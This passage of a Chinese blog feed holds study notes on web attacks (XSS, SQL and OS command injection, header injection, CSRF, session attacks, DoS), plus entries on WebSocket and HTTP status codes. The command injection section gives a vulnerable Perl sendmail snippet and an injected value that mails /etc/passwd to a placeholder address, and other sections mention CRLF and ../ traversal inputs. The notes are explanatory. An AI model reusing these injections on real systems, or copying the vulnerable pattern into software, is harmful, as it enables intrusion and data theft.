    <content type="html"><![CDATA[<h1 id="针对Web应用的攻击模式"><a href="#针对Web应用的攻击模式" class="headerlink" title="针对Web应用的攻击模式"></a>针对Web应用的攻击模式</h1><ul><li>主动攻击</li><li>被动攻击</li></ul><h2 id="以服务器为目标的主动攻击"><a href="#以服务器为目标的主动攻击" class="headerlink" title="以服务器为目标的主动攻击"></a>以服务器为目标的主动攻击</h2><p>指攻击者通过直接访问Web应用，把攻击代码传入的攻击模式，由于该模式是直接针对服务器的资源进行攻击的，因此攻击者需要能访问到那些资源，主动攻击模式里具有代表性的攻击时SQL注入攻击和OS命令注入攻击</p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412181613054-16497586163871.png"></p><h2 id="以服务器为目标的被动攻击"><a href="#以服务器为目标的被动攻击" class="headerlink" title="以服务器为目标的被动攻击"></a>以服务器为目标的被动攻击</h2><p>被动攻击利用圈套策略执行攻击代码的攻击模式。攻击者不直接对目标Web应用访问攻击</p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412182127382-16497589309272.png" alt="image-20220412182127382"></p><h2 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h2><p>是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击，动态创建的HTML部分可能隐藏着安全漏洞，就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，就会受到被动攻击</p><h3 id="跨站脚本攻击可能造成的影响"><a href="#跨站脚本攻击可能造成的影响" class="headerlink" title="跨站脚本攻击可能造成的影响"></a>跨站脚本攻击可能造成的影响</h3><ul><li>利用虚假输入的表单骗取用户个人信息</li><li>利用脚本窃取用户的COOkie值，被害者在不知情的情况下帮助攻击者发送请求</li><li>显示伪造的文章或图片</li></ul><p>eg:</p><p>在网站地址朗中URI测查询字段ID即相当于在表单内自动填写字符串的功能，写入：</p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412183440243-16497596969543.png" alt="image-20220412183440243"></p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412183528509-16497597414094.png" alt="image-20220412183528509"></p><h3 id="对用户Cookie的窃取"><a href="#对用户Cookie的窃取" class="headerlink" title="对用户Cookie的窃取"></a>对用户Cookie的窃取</h3><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412183650899-16497598258515.png" alt="image-20220412183650899"></p><h2 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h2><p>会执行非法SQL的SQL注入攻击</p><h3 id="造成影响："><a href="#造成影响：" class="headerlink" title="造成影响："></a>造成影响：</h3><ul><li>非法查看或篡改数据库内的数据</li><li>规避认证</li><li>执行和数据库服务业务关联的程序等</li></ul><p>eg:</p><p>某购物网站可将坐着名字作为搜索关键字查找他的所有著作</p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412200225045-16497649612096.png" alt="image-20220412200225045"></p><p>结果跟flag=1的设定值无关，只取出author=”上野宣”，这样未出版的书籍也一并显示</p><h2 id="OS命令注入攻击"><a href="#OS命令注入攻击" class="headerlink" title="OS命令注入攻击"></a>OS命令注入攻击</h2><p>指通过Web应用，执行非法的操作系统命令达到攻击的目的，只要在能调用Shell函数的地方就有存在被攻击的风险。</p><p>可以从Web应用中通过Shell来调用操作系统命令，倘若调用Shell时存在疏漏，就可以执行非法的OS命令。OS命令注入攻击可以向Shell发送命令，让Windows或Linux操作系统的命令行启动程序。</p><p>eg:</p><p>咨询表单的发送功能，将用户的咨询邮件按已填写对方的邮箱地址发送过去。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my $adr= $q-&gt;param(&#x27;mailaddress&#x27;);</span><br><span class="line">open(MAIL,&quot;| /usr/sbin/sendmail $adr&quot;);</span><br><span class="line">print MAIL &quot;FROM :info@example.com\n&quot;;</span><br></pre></td></tr></table></figure><p>程序中的open函数会调用sendmail命令发送邮件，而制定邮件发送地址是$adr，攻击者把下面的值制定为邮件地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat /etc/passwd |mail hack@example.jp</span><br></pre></td></tr></table></figure><p>程序接收到该值后构成以下组合：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(MAIL,&quot;| /usr/sbin/sendmail;cat /etc/passwd | mail hack@example.jp</span><br></pre></td></tr></table></figure><p>“;”在OS命令中会被解析为分割多个执行命令的标记，因此sendmail会将含有Linux账户信息/etc/passwd的文件以邮件形式发送给<a href="mailto:&#104;&#x61;&#99;&#x6b;&#64;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#106;&#x70;">&#104;&#x61;&#99;&#x6b;&#64;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#106;&#x70;</a>。</p><h2 id="HTTP首部注入攻击"><a href="#HTTP首部注入攻击" class="headerlink" title="HTTP首部注入攻击"></a>HTTP首部注入攻击</h2><p>值攻击者通过在响应首部字段内插入换行，添加任意响应首部或主题的一种攻击，属于被动攻击模式。向首部主题内添加内容的攻击称为HTTP响应阶段攻击。</p><p>HTTP首部注入攻击有可能会造成以下影响：</p><ul><li>设置任何Cookie信息</li><li>重定向至任意URL</li><li>显示任意的主体（HTTP响应阶段攻击）</li></ul><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412204121818-16497673045847.png" alt="image-20220412204121818"></p><p>此刻，Set-Cookie生效，攻击者可指定修改任意Cookie信息，通过和绘画固定攻击组合，攻击者可伪装成用户</p><p>攻击者输入%0D%0A变成换行符，结果插入了新的首部字段。</p><h2 id="HTTP响应截断攻击"><a href="#HTTP响应截断攻击" class="headerlink" title="HTTP响应截断攻击"></a>HTTP响应截断攻击</h2><p>HTTP响应截断攻击是用在HTTP首部注入的一种攻击，攻击顺序相同，但是要将两个%0D%0A%0D%0A并排插入字符串后发送，利用这两个连续的换行可作出HTTP首部和主体分割所需的空行，这样就能显示伪造的主体，达到攻击目的。</p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412204611730-16497675880148.png" alt="image-20220412204611730"></p><p>利这种攻击，已触发陷阱的用户浏览器会显示伪造的WEB页面，再让用户输入自己的个人信息，达到和XSS攻击相同效果</p><h2 id="邮件首部注入攻击"><a href="#邮件首部注入攻击" class="headerlink" title="邮件首部注入攻击"></a>邮件首部注入攻击</h2><p>攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击。利用存在安全漏洞的Web网站，可对任意邮件地址发送广告邮件或病毒邮件。<br>邮件地址：<br>%0D%0A 代表一个换行符，可以实现邮件地址的追加</p><p>%0D%0A%0D%0A代表两个连续的换行符，可以篡改邮件文本内容</p><h2 id="目录遍历攻击："><a href="#目录遍历攻击：" class="headerlink" title="目录遍历攻击："></a>目录遍历攻击：</h2><p>对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击<br>用户可使用．…/等相对路径定位到/etc/passed等绝对路径上<br>例：</p><h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。<br>例：<img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412210605745-16497687833709.png" alt="image-20220412210605745"></p><h2 id="开放重定向"><a href="#开放重定向" class="headerlink" title="开放重定向"></a>开放重定向</h2><p>是指对指定的任意URL左重定向跳转功能，而与此功能先关联的安全漏洞是指，加入指定的重定向URL到某个具有恶意的Web网站，那么用户就会被诱导到那个网站，有可能被攻击者选中并作为钓鱼攻击的跳板</p><h2 id="因会话管理疏忽引发漏洞"><a href="#因会话管理疏忽引发漏洞" class="headerlink" title="因会话管理疏忽引发漏洞"></a>因会话管理疏忽引发漏洞</h2><p>会话劫持：攻击者通过某种手段拿到用户的会话ID，并非法使用此会话ID伪装成用户，达到攻击目的。</p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412213958720-164977081222410.png" alt="image-20220412213958720">会话</p><h2 id="会话固定攻击"><a href="#会话固定攻击" class="headerlink" title="会话固定攻击"></a>会话固定攻击</h2><p>对以窃取目标会话ID为主动攻击手段的会话劫持，会话固定攻击会强制用户使用攻击者指定额会话ID</p><p>例子：</p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412214406544-164977106060411.png" alt="image-20220412214406544"></p><h2 id="跨站点请求伪造（CSRF）"><a href="#跨站点请求伪造（CSRF）" class="headerlink" title="跨站点请求伪造（CSRF）"></a>跨站点请求伪造（CSRF）</h2><p>是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。</p><h3 id="可能造成的影响："><a href="#可能造成的影响：" class="headerlink" title="可能造成的影响："></a>可能造成的影响：</h3><ul><li>利用已通过认证的用户权限更新设定信息等</li><li>利用已通过认证的用户权限购买商品</li><li>利用已通过认证的用户权限在留言板发表言论</li></ul><p>例子：</p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412215236611-164977157123012.png" alt="image-20220412215236611"></p><h2 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h2><p>是一种让运行中的服务呈停止状态的攻击，有时也叫停止攻击或拒绝服务攻击，DoS攻击的对象不仅限于Web网站，还包括网络设备及服务器。</p><h3 id="主要有两种DOS攻击方式："><a href="#主要有两种DOS攻击方式：" class="headerlink" title="主要有两种DOS攻击方式："></a>主要有两种DOS攻击方式：</h3><ul><li>集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈现停止状态。</li><li>通过攻击安全漏洞使服务停止</li></ul><p>集中利用访问请求，就是发送大量的合法请求，服务器很难分辨何为正常请求，何为攻击请求，因此很难防止DOS攻击。</p><p>多台计算机发起的DOS攻击称为DDOS攻击，DDOS攻击通常利用那些感染病毒的极端及作为攻击者的攻击跳板</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;针对Web应用的攻击模式&quot;&gt;&lt;a href=&quot;#针对Web应用的攻击模式&quot; class=&quot;headerlink&quot; title=&quot;针对Web应用的攻击模式&quot;&gt;&lt;/a&gt;针对Web应用的攻击模式&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;主动攻击&lt;/li&gt;
&lt;li&gt;被动攻击&lt;/li&gt;
</summary>
      
    
    
    
    <category term="http" scheme="https://coloey.github.io/categories/http/"/>
    
    
  </entry>
  
  <entry>
    <title>WebSocket</title>
    <link href="https://coloey.github.io/2022/04/12/WebSocket/"/>
    <id>https://coloey.github.io/2022/04/12/WebSocket/</id>
    <published>2022-04-12T09:46:11.000Z</published>
    <updated>2022-04-12T10:03:19.606Z</updated>
    
    <content type="html"><![CDATA[<p>初次接触 WebSocket 的人，都会问同样的问题：我们已经有了 HTTP 协议，为什么还需要另一个协议？它能带来什么好处？</p><p>答案很简单，因为 HTTP 协议有一个缺陷：通信只能由客户端发起。</p><p>举例来说，我们想了解今天的天气，只能是客户端向服务器发出请求，服务器返回查询结果。HTTP 协议做不到服务器主动向客户端推送信息。</p><p>这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用<a href="https://www.pubnub.com/blog/2014-12-01-http-long-polling/">“轮询”</a>：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。最典型的场景就是聊天室。</p><p>轮询的效率低，非常浪费资源（因为必须不停连接，或者 HTTP 连接始终打开）。因此，工程师们一直在思考，有没有更好的方法。WebSocket 就是这样发明的。</p><h2 id="使用浏览器进行全双工通信的WebSocket"><a href="#使用浏览器进行全双工通信的WebSocket" class="headerlink" title="使用浏览器进行全双工通信的WebSocket"></a>使用浏览器进行全双工通信的WebSocket</h2><p>WebSocket 协议在2008年诞生，2011年成为国际标准。所有浏览器都已经支持了。</p><p>它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于<a href="https://en.wikipedia.org/wiki/Push_technology">服务器推送技术</a>的一种。</p><p>其他特点包括：</p><p>（1）建立在 TCP 协议之上，服务器端的实现比较容易。</p><p>（2）与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。</p><p>（3）减少通信量，只要建立起WebSocket连接，就希望一直保持连接，和http相比，不但每次连接时走开小减少。而且数据格式比较轻量，性能开销小，通信高效。</p><p>（4）可以发送文本，也可以发送二进制数据。</p><p>（5）没有同源限制，客户端可以与任意服务器通信。</p><p>（6）协议标识符是<code>ws</code>（如果加密，则为<code>wss</code>），服务器网址就是 URL。</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ws://example.com:80/some/path</span><br></pre></td></tr></table></figure></blockquote><h2 id="握手请求"><a href="#握手请求" class="headerlink" title="握手请求"></a>握手请求</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Upgrade:websocket</span><br></pre></td></tr></table></figure><p>Set-WebSocket-Key字段内记录着握手过程中必不可少的键值，Sec-WebSocket-Protocol字段内记录使用的子协议，子协议按WebSocket协议标准在连接分开使用时，定义那些连接的名称</p><h2 id="握手响应"><a href="#握手响应" class="headerlink" title="握手响应"></a>握手响应</h2><p>对于之前的请求，返回状态码101 Switching Protocols的响应</p><p><img src="/2022/04/12/WebSocket/image-20220412180138972-16497577748051.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;初次接触 WebSocket 的人，都会问同样的问题：我们已经有了 HTTP 协议，为什么还需要另一个协议？它能带来什么好处？&lt;/p&gt;
&lt;p&gt;答案很简单，因为 HTTP 协议有一个缺陷：通信只能由客户端发起。&lt;/p&gt;
&lt;p&gt;举例来说，我们想了解今天的天气，只能是客户端向服务</summary>
      
    
    
    
    <category term="WebSocket" scheme="https://coloey.github.io/categories/WebSocket/"/>
    
    
  </entry>
  
  <entry>
    <title>返回结果的http状态码</title>
    <link href="https://coloey.github.io/2022/04/11/%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E7%9A%84http%E7%8A%B6%E6%80%81%E7%A0%81/"/>
    <id>https://coloey.github.io/2022/04/11/%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E7%9A%84http%E7%8A%B6%E6%80%81%E7%A0%81/</id>
    <published>2022-04-11T11:58:12.000Z</published>
    <updated>2022-04-11T13:30:34.582Z</updated>
    
    <content type="html"><![CDATA[<h1 id="状态码作用："><a href="#状态码作用：" class="headerlink" title="状态码作用："></a>状态码作用：</h1><p>状态码的职责是当客户端向服务器发送请求时，描述返回的请求结果，借助状态码，用户可以知道服务器时正常处理了请求，还是出现了错误。</p><h1 id="状态码类别："><a href="#状态码类别：" class="headerlink" title="状态码类别："></a>状态码类别：</h1><table><thead><tr><th></th><th>类别</th><th>原因短语</th></tr></thead><tbody><tr><td>1xx</td><td>Informational(信息状态码)</td><td>接收的请求正在处理</td></tr><tr><td>2xx</td><td>Success(成功状态码)</td><td>请求正常处理完毕</td></tr><tr><td>3xx</td><td>Redirection(重定向状态码)</td><td>需要进行附加操作以完成请求</td></tr><tr><td>4xx</td><td>Client Error(客户端错误状态码)</td><td>服务器无法处理请求</td></tr><tr><td>5xx</td><td>Server Error(服务器错误状态码)</td><td>服务器处理请求出错</td></tr></tbody></table><h1 id="2xx成功"><a href="#2xx成功" class="headerlink" title="2xx成功"></a>2xx成功</h1><h2 id="200-OK"><a href="#200-OK" class="headerlink" title="200 OK"></a>200 OK</h2><p>表示从客户端发来的请求在服务器端被正常处理了</p><p>在响应报文内，随状态码一起返回的信息会因方法的不同而发生改变。比如，使用Get方法，对应请求支援的实体会作为响应返回；而使用HEAD方法时，对应请求资源的实体首部不随报文实体作为响应返回。（即在响应中只返回首部，不返回实体主体部分）</p><h2 id="204-No-Content"><a href="#204-No-Content" class="headerlink" title="204 No Content"></a>204 No Content</h2><p>该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，不允许返回任何实体的主体。比如，当从浏览器中发出请求处理后，返回204响应，那么浏览器显示的页面不发生更新。</p><p>一般在只需要从客户端往服务器发送消息，而对客户端不需要发送新消息内容的情况下使用</p><h2 id="206-Partial-Content"><a href="#206-Partial-Content" class="headerlink" title="206 Partial Content"></a>206 Partial Content</h2><p>该状态码表示客户端进行范围请求，而服务器成功执行了这部分的GET请求。响应报文中包含由Content-Range指定范围的实体内容</p><h1 id="3xx重定向"><a href="#3xx重定向" class="headerlink" title="3xx重定向"></a>3xx重定向</h1><p>3xx响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。</p><h2 id="301-Moved-Permanently"><a href="#301-Moved-Permanently" class="headerlink" title="301 Moved Permanently"></a>301 Moved Permanently</h2><p>永久性重定向。该状态码表示请求的资源已被分配了新的URI，以后应该使用资源现在所指的URI，也就是说，如果已经把资源对应的URI保存为书签，这时应该按Location首部字段提示的URI重新保存。</p><p>eg:</p><p><a href="http://example.com/sample">http://example.com/sample</a></p><p>当指定资源路径的最后忘记添加“/“，就会产生301状态码</p><h2 id="302-Found"><a href="#302-Found" class="headerlink" title="302 Found"></a>302 Found</h2><p>临时性重定向，该状态码表示请求的资源已被分配了新的URI，希望用户（本次）能使用新的URI访问。和301 Moved Permanently状态码相似，但302状态码代表的资源不是被永久移动，只是临时性质。换句话说，已移动的资源对应的URI将来还有可能发生改变。用户把URI保存成书签，但不会像301状态码出现时那样去更新书签，而是仍旧保留返回的302状态码的页面对应的URI。</p><h2 id="303-See-Other"><a href="#303-See-Other" class="headerlink" title="303 See Other"></a>303 See Other</h2><p>该状态码表示由于请求对应的资源存在着另一个URI，应使用GET方法定向获取请求的资源。303状态码和302Found状态码有着相同功能。但303状态码明确表示客户端应当采用GET方法获取资源，这点与302状态码有区别。比如，当使用POST方法访问CGI程序，其执行后的处理结果是希望客户端能以GET方法重定向到另一个URI上去时，返回303状态码。</p><p>当301,302,303返回响应码时，几乎所有浏览器都会把POST改为GET，并删除请求报文的主体，之后请求会自动再次发送。</p><p>301,302标准是禁止将POST改为GET，但实际上大家都这么做。</p><h2 id="304-Not-Modified"><a href="#304-Not-Modified" class="headerlink" title="304 Not Modified"></a>304 Not Modified</h2><p>该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况，304状态码返回时，不包括任何响应的主体部分。304和重定向没有关系。</p><h2 id="307-Temporary-Redirect"><a href="#307-Temporary-Redirect" class="headerlink" title="307 Temporary Redirect"></a>307 Temporary Redirect</h2><p>临时重定向。该状态码与302 Found有着相同的含义。尽管302标准禁止POST变为GET，但实际使用时大家并不遵守。307会按照浏览器标准，不会从POST变成GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同情况。</p><h1 id="4xx客户端错误"><a href="#4xx客户端错误" class="headerlink" title="4xx客户端错误"></a>4xx客户端错误</h1><p>4xx的响应结果表明客户端时发生错误的原因所在</p><h2 id="400-Bad-Request"><a href="#400-Bad-Request" class="headerlink" title="400 Bad Request"></a>400 Bad Request</h2><p>该状态码表示请求报文中存在语法错误，当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像200 Ok一样对待状态码</p><h2 id="401-Unauthorized"><a href="#401-Unauthorized" class="headerlink" title="401 Unauthorized"></a>401 Unauthorized</h2><p>该状态码表示发送的请求需要有通过HTTP认证（BASIC认证、DIGEST认证）的认证信息。另外若之前已进行过1次请求，则表示用户认证失败。</p><p>返回含有401的响应必须包含一个适用于被请求资源的WWW-Authenticate首部用于质询用户信息，当浏览器初次接收到401响应，会弹出认证用的对话窗口。</p><h2 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h2><p>该状态码表明对请求资源的访问被服务器拒绝了。服务端没有给出拒绝的详细理由，但如果做说明，可以在实体的主体部分对原因进行描述。</p><p>未获得文件系统的访问授权，访问权限出现某些问题（从未授权的源IP地址试图访问）等列举的情况都可能是发生403的原因。</p><h2 id="404-Not-Found"><a href="#404-Not-Found" class="headerlink" title="404 Not Found"></a>404 Not Found</h2><p>该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务端拒绝请求且不想说理由时使用。</p><h1 id="5xx服务器错误"><a href="#5xx服务器错误" class="headerlink" title="5xx服务器错误"></a>5xx服务器错误</h1><p>5xx的响应结果表明服务器本身发生错误</p><h2 id="500-Internal-Server-Error"><a href="#500-Internal-Server-Error" class="headerlink" title="500 Internal Server Error"></a>500 Internal Server Error</h2><p>表明服务器端在执行请求时发生了错误，也有可能时Web应用存在的bug或某些临时的故障</p><h2 id="503-Service-Unavailable"><a href="#503-Service-Unavailable" class="headerlink" title="503 Service Unavailable"></a>503 Service Unavailable</h2><p>表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。如果事先得知解除以上状况需要的时间，最好写入Retry-After首部字段再返回给客户端。</p><p>状态码和状况不一致：</p><p>不少返回的状态码响应都是错误的，但是用户可能察觉不到这点，比如Web应用程序内部发生错误，状态码依然返回200 OK。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;状态码作用：&quot;&gt;&lt;a href=&quot;#状态码作用：&quot; class=&quot;headerlink&quot; title=&quot;状态码作用：&quot;&gt;&lt;/a&gt;状态码作用：&lt;/h1&gt;&lt;p&gt;状态码的职责是当客户端向服务器发送请求时，描述返回的请求结果，借助状态码，用户可以知道服务器时正常处理了请求</summary>
      
    
    
    
    <category term="http" scheme="https://coloey.github.io/categories/http/"/>
    
    
  </entry>
  
</feed>
